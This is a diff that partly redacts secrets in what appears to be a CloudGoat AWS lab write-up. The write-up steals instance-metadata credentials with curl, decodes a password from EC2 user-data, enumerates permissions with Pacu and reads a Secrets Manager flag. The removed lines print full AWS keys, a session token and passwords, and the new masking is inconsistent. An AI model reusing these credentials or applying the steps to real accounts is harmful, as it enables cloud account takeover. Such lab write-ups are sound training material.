@@ -47,8 +47,8 @@ After launching the lab, I received credentials, configure the credentials in th
 
 Tip: You can deliver temporary credentials to the AWS CLI using your AWS Console session by running the command 'aws login'.
 
-AWS Access Key ID [None]: AKIAQ7H5VOHZUCKNFQHD
-AWS Secret Access Key [None]: E8E4rGpuF/9mUyA6ZPfMFR4EmIZORwzKhT4BGjX4
+AWS Access Key ID [None]: AKIAQ7H5V******UCKNFQHD
+AWS Secret Access Key [None]: E8E4rGpuF/9*******fMFR4EmIZORwzKhT4BGjX4
 Default region name [None]: us-east-1
 Default output format [None]: json
 
@@ -111,7 +111,7 @@ Pacu (datasecrets:imported-datasecrets) > whoami
   "Roles": null,
   "Groups": null,
   "Policies": null,
-  "AccessKeyId": "AKIAQ7H5VOHZUCKNFQHD",
+  "AccessKeyId": "AKIAQ7H5V*******KNFQHD",
   "SecretAccessKey": "E8E4rGpuF/9mUyA6ZPfM********************",
   "SessionToken": null,
   "KeyAlias": "imported-datasecrets",
@@ -433,7 +433,7 @@ all_user_data.txt  i-0ff7c1e1a2ea985dd.txt
 └──╼ $cat all_user_data.txt
 i-0ff7c1e1a2ea985dd@us-east-1:
 #!/bin/bash
-echo "ec2-user:CloudGoatInstancePassword!" | chpasswd
+echo "ec2-user:C************word!" | chpasswd
 sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/g' /etc/ssh/sshd_config
 service sshd restart
 
@@ -443,7 +443,7 @@ I found a script which have default SSH username and password for EC2 instance.
 
 ```
 Username - ec2-user
-Password - CloudGoatIn*****Password!
+Password - Clo***********Password!
 
 ```
 
@@ -534,9 +534,9 @@ cg-ec2-role-lab[ec2-user@ip-10-0-1-29 ~]$ curl http://169.254.169.254/latest/met
   "Code" : "Success",
   "LastUpdated" : "2026-08-02T17:38:36Z",
   "Type" : "AWS-HMAC",
-  "AccessKeyId" : "ASIAQ7H5VOHZQQ2CE7VO",
-  "SecretAccessKey" : "FMGhfU+t/QJJNUJrfXRiIxSeVh6t+qaQxxdwNTI+",
-  "Token" : "IQoJb3JpZ2luX2VjEBoaCXVzLWVhc3QtMSJIMEYCIQDI5+B3Fct6B463D/UdWNEuY4M41kK+MAH1ZwfH/VGKzQIhAJczsRFQcgPKsyRwbS/Fn/2MwZuUOCwQWw6748R7KWuWKsEFCOP//////////wEQABoMMDY3MTAzOTc3OTcxIgy/nnWqwdL2ZoXmEyEqlQUCy32q6TVhVRoaPzgiVj2ctLd/ABQzBBeBAXjqLjFRwe0IxTbgoWy5Vwnskt22iBOzKlVDgZO7qF01Q8+8CvGp55xMiy+bIcBkZwgDDLOMeAxQRzVyFSs43APnHm7WVGmDYBE6hYIeP07eJuNFkg5yURAX8GbU2Vt9iI3eajKZ5E74VaR4S2PmiW5pjBPZOX6LrvyByeQcgmCXHXd3MLL4cYByc+Vm28aBxGvCX6Inbfm7zKRgTUbfgrc0MVLcHY+mqNGGEO9oBhBM8bgoNpHPtbGYa/kQK51KyNV7O0FcUhk8PT/6hBwbZRF1kXqSh52oq0TqBSClbkRtZ5ZqN2cafWf0sSZc+zBSsVdgT0CwY9kHPVNrvrBDKBzwAytcXLEZ5ifYegLQprIbKNmkIYgvXB4wlAHgbQPEtap8wSc+aceN4O+ekixjjFDvBp5qSkt2tTDj4RyinE6TafR46vs9OmNjWTH0Gacp4UCd6NuXv+j7Z9/0CRzfgaCd+7uMBb+/kZ+RveIBsSmXoi+PwScdIf5ZFSBMQ6fVy7kgGMjSi5BJw+02hx6W3Sd1OPuMHWdHwU8hEDpTWy65Ff8tYfwSgsvTDPeyvxP68AXoNNmcG5aXSmlUQ6Haf+IYsU2NXWUgZ5KNSxCIc/6i186YKpG0l23uaLKRKMfJ7Cj8BMOifpzfUyZ7JgtKlyQiNjEFfduALrsbNBvihUg7y3nYCIunt7ASa+xg7QGF4v2HwfDmnN17iQ8kL7lOanVIU7xHMQJrrqCoUUOX0nmRPHB6UWjjxSQGKAjAmXZiOvTROvoCVnPQRoMsgySuTHg7k9GGxx9i0oPlHdTWK2zRmNf3odq3OSagAFj/U8hUKlaBOfH2jatyLds6MPWAvtMGOrAB1sVVyq6hPqxMCPUUvshQjVBgBXqz5NXEki9CBSnPQXFHnyDfx5oMUEtocSYx6BHcI6OW67viFdQUfdyLWo9thOyJbrsjkxcGPnNBOWxKR0Y1mLbZYhQKCEjE44Vz0QDowapBkbotKYrgF/d7xeBDLn3BL4rB3CTyDWfl8amJ1PfQOcqGKMJZRDS/g6nTte9LTIaS4nWlm8hbJ+n9/q8U1evIlvYLaFgZujNgOhsi2vQ=",
+  "AccessKeyId" : "ASI********QQ2CE7VO",
+  "SecretAccessKey" : "FMGhfU+*********IxSeVh6t+qaQxxdwNTI+",
+  "Token" : "IQoJb3JpZ2luX2VjEBoaCXVzLWVhc3QtMSJIMEYCIQDI5+B3Fct6B463D/UdWNEuY4M41kK+MAH1ZwfH/VGKzQIhAJczsRFQcgPKsyRwbS/Fn/2MwZuUOCwQWw6748R7KWuWKsEFCOP//////////wEQABoMMDY3MTAzOTc3OTcxIgy/nnWqwdL2ZoXmEyEqlQUCy32q6TVhVRoaPzgiVj2ctLd/ABQzBBeBAXjqLjFRwe0IxTbgoWy5Vwnskt22iBOzKlVDgZO7qF01Q8+8CvGp55xMiy+bIcBkZwgDDLOMeAxQRzVyFSs****************************************Wf0sSZc+zBSsVdgT0CwY9kHPVNrvrBDKBzwAytcXLEZ5ifYegLQprIbKNmkIYgvXB4wlAHgbQPEtap8wSc+aceN4O+ekixjjFDvBp5qSkt2tTDj4RyinE6TafR46vs9OmNjWTH0Gacp4UCd6NuXv+j7Z9/0CRzfgaCd+7uMBb+/kZ+RveIBsSmXoi+PwScdIf5ZFSBMQ6fVy7kgGMjSi5BJw+02hx6W3Sd1OPuMHWdHwU8hEDpTWy65Ff8tYfwSgsvTDPeyvxP68AXoNNmcG5aXSmlUQ6Haf+IYsU2NXWUgZ5KNSxCIc/6i186YKpG0l23uaLKRKMfJ7Cj8BMOifpzfUyZ7JgtKlyQiNjEFfduALrsbNBvihUg7y3nYCIunt7ASa+xg7QGF4v2HwfDmnN17iQ8kL7lOanVIU7xHMQJrrqCoUUOX0nmRPHB6UWjjxSQGKAjAmXZiOvTROvoCVnPQRoMsgySuTHg7k9GGxx9i0oPlHdTWK2zRmNf3odq3OSagAFj/U8hUKlaBOfH2jatyLds6MPWAvtMGOrAB1sVVyq6hPqxMCPUUvshQjVBgBXqz5NXEki9CBSnPQXFHnyDfx5oMUEtocSYx6BHcI6OW67viFdQUfdyLWo9thOyJbrsjkxcGPnNBOWxKR0Y1mLbZYhQKCEjE44Vz0QDowapBkbotKYrgF/d7xeBDLn3BL4rB3CTyDWfl8amJ1PfQOcqGKMJZRDS/g6nTte9LTIaS4nWlm8hbJ+n9/q8U1evIlvYLaFgZujNgOhsi2vQ=",
   "Expiration" : "2026-08-03T00:12:57Z"
 }[ec2-user@ip-10-0-1-29 ~]$
 
@@ -550,9 +550,9 @@ Configure the Identified credentials in the AWS CLI.
 
 Tip: You can deliver temporary credentials to the AWS CLI using your AWS Console session by running the command 'aws login'.
 
-AWS Access Key ID [None]: ASIAQ7H5VOHZQQ2CE7VO
-AWS Secret Access Key [None]: FMGhfU+t/QJJNUJrfXRiIxSeVh6t+qaQxxdwNTI+
-AWS Session Token [None]: IQoJb3JpZ2luX2VjEBoaCXVzLWVhc3QtMSJIMEYCIQDI5+B3Fct6B463D/UdWNEuY4M41kK+MAH1ZwfH/VGKzQIhAJczsRFQcgPKsyRwbS/Fn/2MwZuUOCwQWw6748R7KWuWKsEFCOP//////////wEQABoMMDY3MTAzOTc3OTcxIgy/nnWqwdL2ZoXmEyEqlQUCy32q6TVhVRoaPzgiVj2ctLd/ABQzBBeBAXjqLjFRwe0IxTbgoWy5Vwnskt22iBOzKlVDgZO7qF01Q8+8CvGp55xMiy+bIcBkZwgDDLOMeAxQRzVyFSs43APnHm7WVGmDYBE6hYIeP07eJuNFkg5yURAX8GbU2Vt9iI3eajKZ5E74VaR4S2PmiW5pjBPZOX6LrvyByeQcgmCXHXd3MLL4cYByc+Vm28aBxGvCX6Inbfm7zKRgTUbfgrc0MVLcHY+mqNGGEO9oBhBM8bgoNpHPtbGYa/kQK51KyNV7O0FcUhk8PT/6hBwbZRF1kXqSh52oq0TqBSClbkRtZ5ZqN2cafWf0sSZc+zBSsVdgT0CwY9kHPVNrvrBDKBzwAytcXLEZ5ifYegLQprIbKNmkIYgvXB4wlAHgbQPEtap8wSc+aceN4O+ekixjjFDvBp5qSkt2tTDj4RyinE6TafR46vs9OmNjWTH0Gacp4UCd6NuXv+j7Z9/0CRzfgaCd+7uMBb+/kZ+RveIBsSmXoi+PwScdIf5ZFSBMQ6fVy7kgGMjSi5BJw+02hx6W3Sd1OPuMHWdHwU8hEDpTWy65Ff8tYfwSgsvTDPeyvxP68AXoNNmcG5aXSmlUQ6Haf+IYsU2NXWUgZ5KNSxCIc/6i186YKpG0l23uaLKRKMfJ7Cj8BMOifpzfUyZ7JgtKlyQiNjEFfduALrsbNBvihUg7y3nYCIunt7ASa+xg7QGF4v2HwfDmnN17iQ8kL7lOanVIU7xHMQJrrqCoUUOX0nmRPHB6UWjjxSQGKAjAmXZiOvTROvoCVnPQRoMsgySuTHg7k9GGxx9i0oPlHdTWK2zRmNf3odq3OSagAFj/U8hUKlaBOfH2jatyLds6MPWAvtMGOrAB1sVVyq6hPqxMCPUUvshQjVBgBXqz5NXEki9CBSnPQXFHnyDfx5oMUEtocSYx6BHcI6OW67viFdQUfdyLWo9thOyJbrsjkxcGPnNBOWxKR0Y1mLbZYhQKCEjE44Vz0QDowapBkbotKYrgF/d7xeBDLn3BL4rB3CTyDWfl8amJ1PfQOcqGKMJZRDS/g6nTte9LTIaS4nWlm8hbJ+n9/q8U1evIlvYLaFgZujNgOhsi2vQ=
+AWS Access Key ID [None]: ASIAQ***********VO
+AWS Secret Access Key [None]: FMNUJrfX*************xdwNTI+
+AWS Session Token [None]: IQoJb3JpZ2luX2VjEBoaCXVzLWVhc3QtMSJIMEYCIQDI5+B3Fct6B463D/UdWNEuY4M41kK+MAH1ZwfH/VGKzQIhAJczsRFQcgPKsyRwbS/Fn/2MwZuUOCwQWw6748R7KWuWKsEFCOP//////////wEQABoMMDY3MTAzOTc3OTcxIgy/nnWqwdL2ZoXmEyEqlQUCy32q6TVhVRoaPzgiVj2ctLd/ABQzBBe********************BAXjqLjFRwe0IxTbgoWy5Vwnskt22iBOzKlVDgZO7qF01Q8+8CvGp55xMiy+bIcBkZwgDDLOMeAxQRzVyFSs43APnHm7WVGmDYBE6hYIeP07eJuNFkg5yURAX8GbU2Vt9iI3eajKZ5E74VaR4S2PmiW5pjBPZOX6LrvyByeQcgmCXHXd3MLL4cYByc+Vm28aBxGvCX6Inbfm7zKRgTUbfgrc0MVLcHY+mqNGGEO9oBhBM8bgoNpHPtbGYa/kQK51KyNV7O0FcUhk8PT/6hBwbZRF1kXqSh52oq0TqBSClbkRtZ5ZqN2cafWf0sSZc+zBSsVdgT0CwY9kHPVNrvrBDKBzwAytcXLEZ5ifYegLQprIbKNmkIYgvXB4wlAHgbQPEtap8wSc+aceN4O+ekixjjFDvBp5qSkt2tTDj4RyinE6TafR46vs9OmNjWTH0Gacp4UCd6NuXv+j7Z9/0CRzfgaCd+7uMBb+/kZ+RveIBsSmXoi+PwScdIf5ZFSBMQ6fVy7kgGMjSi5BJw+02hx6W3Sd1OPuMHWdHwU8hEDpTWy65Ff8tYfwSgsvTDPeyvxP68AXoNNmcG5aXSmlUQ6Haf+IYsU2NXWUgZ5KNSxCIc/6i186YKpG0l23uaLKRKMfJ7Cj8BMOifpzfUyZ7JgtKlyQiNjEFfduALrsbNBvihUg7y3nYCIunt7ASa+xg7QGF4v2HwfDmnN17iQ8kL7lOanVIU7xHMQJrrqCoUUOX0nmRPHB6UWjjxSQGKAjAmXZiOvTROvoCVnPQRoMsgySuTHg7k9GGxx9i0oPlHdTWK2zRmNf3odq3OSagAFj/U8hUKlaBOfH2jatyLds6MPWAvtMGOrAB1sVVyq6hPqxMCPUUvshQjVBgBXqz5NXEki9CBSnPQXFHnyDfx5oMUEtocSYx6BHcI6OW67viFdQUfdyLWo9thOyJbrsjkxcGPnNBOWxKR0Y1mLbZYhQKCEjE44Vz0QDowapBkbotKYrgF/d7xeBDLn3BL4rB3CTyDWfl8amJ1PfQOcqGKMJZRDS/g6nTte9LTIaS4nWlm8hbJ+n9/q8U1evIlvYLaFgZujNgOhsi2vQ=
 Default region name [None]: us-east-1
 Default output format [None]: json
 
@@ -588,7 +588,7 @@ Pacu (datasecrets:imported-cg-ec2) > run iam__bruteforce_permissions --region us
   Running module iam__bruteforce_permissions...
 [iam__bruteforce_permissions] Enumerated IAM Permissions:
 [iam__bruteforce_permissions] Enumerating us-east-1
-2026-08-03 00:03:02,759 - 2452 - [INFO] Starting permission enumeration for access-key-id "ASIAQ7H5VOHZQQ2CE7VO"
+2026-08-03 00:03:02,759 - 2452 - [INFO] Starting permission enumeration for access-key-id "ASIAQ7H5VO****2CE7VO"
 2026-08-03 00:03:03,809 - 2452 - [INFO] -- Account ARN : arn:aws:sts::067103977971:assumed-role/cg-ec2-role-lab/i-0ff7c1e1a2ea985dd
 2026-08-03 00:03:03,809 - 2452 - [INFO] -- Account Id  : 067103977971
 2026-08-03 00:03:03,809 - 2452 - [INFO] -- Account Path: assumed-role/cg-ec2-role-lab/i-0ff7c1e1a2ea985dd
@@ -618,8 +618,8 @@ Pacu (datasecrets:imported-cg-ec2) > run lambda__enum --region us-east-1
 [lambda__enum]     MISSING NEEDED PERMISSIONS
 [lambda__enum]   FAILURE:
 [lambda__enum]     MISSING NEEDED PERMISSIONS
-        [+] Secret (ENV): DB_USER_ACCESS_KEY= AKIAQ7H5VOHZU5ZTF6XC
-        [+] Secret (ENV): DB_USER_SECRET_KEY= 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
+        [+] Secret (ENV): DB_USER_ACCESS_KEY= AKIAQ7H******5ZTF6XC
+        [+] Secret (ENV): DB_USER_SECRET_KEY= KgDn3Dda51POQ********Wz3Mw0gXhLm6J42vA
 [lambda__enum] lambda__enum completed.
 
 [lambda__enum] MODULE SUMMARY:
@@ -638,8 +638,8 @@ I found DB user credentials stored in the lambda environment variable. I configu
 
 Tip: You can deliver temporary credentials to the AWS CLI using your AWS Console session by running the command 'aws login'.
 
-AWS Access Key ID [None]: AKIAQ7H5VOHZU5ZTF6XC
-AWS Secret Access Key [None]: KgDn3Dda51POQIRov4OMN4RWz3Mw0gXhLm6J42vA
+AWS Access Key ID [None]: AKIAQ7********5ZTF6XC
+AWS Secret Access Key [None]: KgDn3Dda51******4RWz3Mw0gXhLm6J42vA
 Default region name [None]: us-east-1
 Default output format [None]: json
 
@@ -670,7 +670,7 @@ Pacu (datasecrets:imported-db_user) > run iam__bruteforce_permissions --region u
   Running module iam__bruteforce_permissions...
 [iam__bruteforce_permissions] Enumerated IAM Permissions:
 [iam__bruteforce_permissions] Enumerating us-east-1
-2026-08-03 00:13:38,718 - 2452 - [INFO] Starting permission enumeration for access-key-id "AKIAQ7H5VOHZU5ZTF6XC"
+2026-08-03 00:13:38,718 - 2452 - [INFO] Starting permission enumeration for access-key-id "AK*********ZU5ZTF6XC"
 2026-08-03 00:13:39,702 - 2452 - [INFO] -- Account ARN : arn:aws:iam::067103977971:user/cg-lambda-user-lab
 2026-08-03 00:13:39,703 - 2452 - [INFO] -- Account Id  : 067103977971
 2026-08-03 00:13:39,703 - 2452 - [INFO] -- Account Path: user/cg-lambda-user-lab
@@ -695,7 +695,7 @@ Pacu (datasecrets:imported-db_user) > whoami
   "Roles": null,
   "Groups": null,
   "Policies": null,
-  "AccessKeyId": "AKIAQ7H5VOHZU5ZTF6XC",
+  "AccessKeyId": "AKIAQ*******U5ZTF6XC",
   "SecretAccessKey": "KgDn3Dda51POQIRov4OM********************",
   "SessionToken": null,
   "KeyAlias": "imported-db_user",
@@ -757,7 +757,7 @@ I configured AWS CLI with given credentials and the `get-caller-identity` comman
 ┌─[jay@parrot]─[~]
 └──╼ $aws sts get-caller-identity --profile datasecrets
 {
-    "UserId": "AIDAQ7H5VOHZ5FY3XQZIV",
+    "UserId": "AIDAQ7H5VOHZ5F*****ZIV",
     "Account": "067103977971",
     "Arn": "arn:aws:iam::067103977971:user/cg-start-user-lab"
 }
@@ -977,7 +977,7 @@ I have identified a base64 data.
 ┌─[jay@parrot]─[~]
 └──╼ $echo "IyEvYmluL2Jhc2gKZWNobyAiZWMyLXVzZXI6Q2xvdWRHb2F0SW5zdGFuY2VQYXNzd29yZCEiIHwgY2hwYXNzd2QKc2VkIC1pICdzL1Bhc3N3b3JkQXV0aGVudGljYXRpb24gbm8vUGFzc3dvcmRBdXRoZW50aWNhdGlvbiB5ZXMvZycgL2V0Yy9zc2gvc3NoZF9jb25maWcKc2VydmljZSBzc2hkIHJlc3RhcnQK" | base64 -d
 #!/bin/bash
-echo "ec2-user:CloudGoatInstancePassword!" | chpasswd
+echo "ec2-user:Clo********sword!" | chpasswd
 sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/g' /etc/ssh/sshd_config
 service sshd restart
 
@@ -1078,9 +1078,9 @@ cg-ec2-role-lab[ec2-user@ip-10-0-1-29 ~]$ curl http://169.254.169.254/latest/met
   "Code" : "Success",
   "LastUpdated" : "2026-08-02T17:38:36Z",
   "Type" : "AWS-HMAC",
-  "AccessKeyId" : "ASIAQ7H5VOHZQQ2CE7VO",
-  "SecretAccessKey" : "FMGhfU+t/QJJNUJrfXRiIxSeVh6t+qaQxxdwNTI+",
-  "Token" : "IQoJb3JpZ2luX2VjEBoaCXVzLWVhc3QtMSJIMEYCIQDI5+B3Fct6B463D/UdWNEuY4M41kK+MAH1ZwfH/VGKzQIhAJczsRFQcgPKsyRwbS/Fn/2MwZuUOCwQWw6748R7KWuWKsEFCOP//////////wEQABoMMDY3MTAzOTc3OTcxIgy/nnWqwdL2ZoXmEyEqlQUCy32q6TVhVRoaPzgiVj2ctLd/ABQzBBeBAXjqLjFRwe0IxTbgoWy5Vwnskt22iBOzKlVDgZO7qF01Q8+8CvGp55xMiy+bIcBkZwgDDLOMeAxQRzVyFSs43APnHm7WVGmDYBE6hYIeP07eJuNFkg5yURAX8GbU2Vt9iI3eajKZ5E74VaR4S2PmiW5pjBPZOX6LrvyByeQcgmCXHXd3MLL4cYByc+Vm28aBxGvCX6Inbfm7zKRgTUbfgrc0MVLcHY+mqNGGEO9oBhBM8bgoNpHPtbGYa/kQK51KyNV7O0FcUhk8PT/6hBwbZRF1kXqSh52oq0TqBSClbkRtZ5ZqN2cafWf0sSZc+zBSsVdgT0CwY9kHPVNrvrBDKBzwAytcXLEZ5ifYegLQprIbKNmkIYgvXB4wlAHgbQPEtap8wSc+aceN4O+ekixjjFDvBp5qSkt2tTDj4RyinE6TafR46vs9OmNjWTH0Gacp4UCd6NuXv+j7Z9/0CRzfgaCd+7uMBb+/kZ+RveIBsSmXoi+PwScdIf5ZFSBMQ6fVy7kgGMjSi5BJw+02hx6W3Sd1OPuMHWdHwU8hEDpTWy65Ff8tYfwSgsvTDPeyvxP68AXoNNmcG5aXSmlUQ6Haf+IYsU2NXWUgZ5KNSxCIc/6i186YKpG0l23uaLKRKMfJ7Cj8BMOifpzfUyZ7JgtKlyQiNjEFfduALrsbNBvihUg7y3nYCIunt7ASa+xg7QGF4v2HwfDmnN17iQ8kL7lOanVIU7xHMQJrrqCoUUOX0nmRPHB6UWjjxSQGKAjAmXZiOvTROvoCVnPQRoMsgySuTHg7k9GGxx9i0oPlHdTWK2zRmNf3odq3OSagAFj/U8hUKlaBOfH2jatyLds6MPWAvtMGOrAB1sVVyq6hPqxMCPUUvshQjVBgBXqz5NXEki9CBSnPQXFHnyDfx5oMUEtocSYx6BHcI6OW67viFdQUfdyLWo9thOyJbrsjkxcGPnNBOWxKR0Y1mLbZYhQKCEjE44Vz0QDowapBkbotKYrgF/d7xeBDLn3BL4rB3CTyDWfl8amJ1PfQOcqGKMJZRDS/g6nTte9LTIaS4nWlm8hbJ+n9/q8U1evIlvYLaFgZujNgOhsi2vQ=",
+  "AccessKeyId" : "ASIAQ7H5******2CE7VO",
+  "SecretAccessKey" : "FMGhfU+t/Q*******iIxSeVh6t+qaQxxdwNTI+",
+  "Token" : "IQoJb3JpZ2luX2VjEBoaCXVzLWVhc3QtMSJIMEYCIQDI5+B3Fct6B463D/UdWNEuY4M41kK+MAH1ZwfH/VGKzQIhAJczsRFQcgPKsyRwbS/Fn/2MwZuUOCwQWw6748R7KWuWKsEFCOP//////////wEQABoMMDY3MTAzOTc3OTcxIgy/nnWqwdL2ZoXmEyEqlQUCy32q6TVhVRoaPzgiVj2ctLd/ABQzBBeBAXjqLjFRwe0IxTbgoWy5Vwnskt22iBOzKlVDgZO7qF01Q8+8CvGp55xMiy+bIcBkZwgDDLOMeAxQRzVyFSs43APnHm7WVGmD*********EO9oBhBM8bgoNpHPtbGYa/kQK51KyNV7O0FcUhk8PT/6hBwbZRF1kXqSh52oq0TqBSClbkRtZ5ZqN2cafWf0sSZc+zBSsVdgT0CwY9kHPVNrvrBDKBzwAytcXLEZ5ifYegLQprIbKNmkIYgvXB4wlAHgbQPEtap8wSc+aceN4O+ekixjjFDvBp5qSkt2tTDj4RyinE6TafR46vs9OmNjWTH0Gacp4UCd6NuXv+j7Z9/0CRzfgaCd+7uMBb+/kZ+RveIBsSmXoi+PwScdIf5ZFSBMQ6fVy7kgGMjSi5BJw+02hx6W3Sd1OPuMHWdHwU8hEDpTWy65Ff8tYfwSgsvTDPeyvxP68AXoNNmcG5aXSmlUQ6Haf+IYsU2NXWUgZ5KNSxCIc/6i186YKpG0l23uaLKRKMfJ7Cj8BMOifpzfUyZ7JgtKlyQiNjEFfduALrsbNBvihUg7y3nYCIunt7ASa+xg7QGF4v2HwfDmnN17iQ8kL7lOanVIU7xHMQJrrqCoUUOX0nmRPHB6UWjjxSQGKAjAmXZiOvTROvoCVnPQRoMsgySuTHg7k9GGxx9i0oPlHdTWK2zRmNf3odq3OSagAFj/U8hUKlaBOfH2jatyLds6MPWAvtMGOrAB1sVVyq6hPqxMCPUUvshQjVBgBXqz5NXEki9CBSnPQXFHnyDfx5oMUEtocSYx6BHcI6OW67viFdQUfdyLWo9thOyJbrsjkxcGPnNBOWxKR0Y1mLbZYhQKCEjE44Vz0QDowapBkbotKYrgF/d7xeBDLn3BL4rB3CTyDWfl8amJ1PfQOcqGKMJZRDS/g6nTte9LTIaS4nWlm8hbJ+n9/q8U1evIlvYLaFgZujNgOhsi2vQ=",
   "Expiration" : "2026-08-03T00:12:57Z"
 }[ec2-user@ip-10-0-1-29 ~]$
 
@@ -1125,8 +1125,8 @@ I attempt to list lambda functions, and found the credentials of a DB user.
             "Version": "$LATEST",
             "Environment": {
                 "Variables": {
-                    "DB_USER_ACCESS_KEY": "AKIAQ7H5VOHZU5ZTF6XC",
-                    "DB_USER_SECRET_KEY": "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"
+                    "DB_USER_ACCESS_KEY": "AKIAQ7H5******ZTF6XC",
+                    "DB_USER_SECRET_KEY": "KgDn3Dda51POQI***3Mw0gXhLm6J42vA"
                 }
             },
             "TracingConfig": {
@@ -1164,8 +1164,8 @@ I attempt to list lambda functions, and found the credentials of a DB user.
 
 Tip: You can deliver temporary credentials to the AWS CLI using your AWS Console session by running the command 'aws login'.
 
-AWS Access Key ID [None]: AKIAQ7H5VOHZU5ZTF6XC
-AWS Secret Access Key [None]: KgDn3Dda51POQIRov4OMN4RWz3Mw0gXhLm6J42vA
+AWS Access Key ID [None]: AKIAQ7H5VO*******F6XC
+AWS Secret Access Key [None]: KgDn3Dda51POQIRov4********6J42vA
 Default region name [None]: us-east-1
 Default output format [None]: json
 
@@ -1240,7 +1240,7 @@ Found the secret ID cg-final-flag-lab . Now I run the command to get secret.
     "ARN": "arn:aws:secretsmanager:us-east-1:067103977971:secret:cg-final-flag-lab-5esbyD",
     "Name": "cg-final-flag-lab",
     "VersionId": "terraform-cAEimvrmeduKXghFp0OE1rKttB",
-    "SecretString": "{\"flag\":\"d4t4_s3cr3ts_4r3_fun\"}",
+    "SecretString": "{\"flag\":\"****************\"}",
     "VersionStages": [
         "AWSCURRENT"
     ],
